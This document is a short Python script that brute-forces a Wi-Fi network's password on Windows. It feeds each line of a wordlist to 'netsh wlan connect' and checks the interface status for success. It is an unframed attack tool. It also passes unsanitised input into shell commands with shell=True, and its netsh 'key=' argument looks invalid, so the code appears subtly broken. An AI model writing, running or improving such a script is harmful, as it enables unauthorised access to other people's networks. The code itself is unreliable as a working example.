import subprocess
import time

# Get the target network name
ssid = input('Target SSID: ').strip()

try:
    # Open the password file
    with open('passwords.txt', 'r') as file:
        passwords = file.read().splitlines()
except FileNotFoundError:
    print("Error: 'passwords.txt' not found.")
    exit()

# Iterate through each password
for password in passwords:
    print(f"Trying: {password}")
    
    # Construct the command
    command = f'netsh wlan connect name="{ssid}" key="{password}"'
    
    # Run the command silently
    subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Wait for the connection attempt
    time.sleep(8)
    
    # Check if the connection was successful
    # We verify by checking the current interface status
    check_output = subprocess.run('netsh wlan show interfaces', shell=True, capture_output=True, text=True)
    
    if ssid in check_output.stdout:
        print(f"\n✅ Password: {password}")
        break
    else:
        print("Failed\n")
else:
    print("Password not found in list.")